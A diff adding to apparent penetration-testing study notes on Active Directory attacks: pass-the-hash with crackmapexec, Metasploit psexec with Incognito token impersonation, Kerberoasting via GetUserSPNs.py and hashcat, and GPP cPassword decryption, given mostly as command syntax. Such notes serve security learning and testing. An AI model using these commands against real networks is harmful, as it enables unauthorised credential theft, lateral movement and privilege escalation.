@@ -229,4 +229,56 @@ Now, to pass the hash, we are going to use crackmapexec.
 
 syntax: crackmapexec smb IPRANGE -u "User Name"/userlogin -H <HASH> --local-auth
 
+This allows us to rather use a hash and not have to crack a password to take advantage of users.
+
+Token Impersonation with Incognito
+
+Every time a user logs into a machine, a token is created and this token remains in place until the machine is rebooted. So, let´s do that.
+
+syntax: msfconsole
+syntax: search psexec
+syntax: options
+syntax: set RHOSTS IP
+syntax: set SMBDomain DOMAIN
+syntax: set SMBUser USERNAME
+syntax: set SMBPass PASSWORD
+syntax: show targets
+syntax: set TARGET ID
+syntax: options
+syntax: set LHOST INTERFACE/IP
+syntax: exploit
+
+if we get a meterpreter shell, run the following:
+
+syntax: load incognito
+syntax: list_tokens -u
+syntax: impersonate_token DOMAIN\\username
+
+This allows you to impersonate any user that has logged into the system since the last reboot. It means you can move laterally through a system and try to escalate privileges.
+
+Kerberoasting
+
+With Kerberoasting, we are going to make use of the fact that we have a valid username and password and request a service ticket from the Domain Controller, which runs Kerberos. The request will then provide a response with a service hash, which we can then crack. 
+
+We need to use a tool in Impactor. 
+
+syntax: GetUserSPNs.py DOMAIN/username:password -dc-ip DCIP -request
+
+The response will give us a hash, which we can add to our hashes that we already have and then we can crack it using hashcat. 
+
+In hashcat, the module we need is for Kerberos TGS, which we can do a grep for.
+
+We can then use the cracked password to do either lateral or vertical movement, especially if the service account is set up incorrectly as an Admin on the DC. 
+
+GPP/cPassword
+
+It is really important to check for this vulnerability, even if one would assume that the machines have the patch installed. We are interested in finding the Groups.xml file, which is found in SysVol. 
+
+Once you have the cPassword within the Groups.xml file, you can run gpp-decrypt on the kali machine to break it. 
+
+syntax: gpp-decrypt cPassword
+
+With this, one can try to escalate privileges or even, if it is a service user, use Kerberoasting to get another hash and see if you can get Admin access on the DC. 
+
+
 
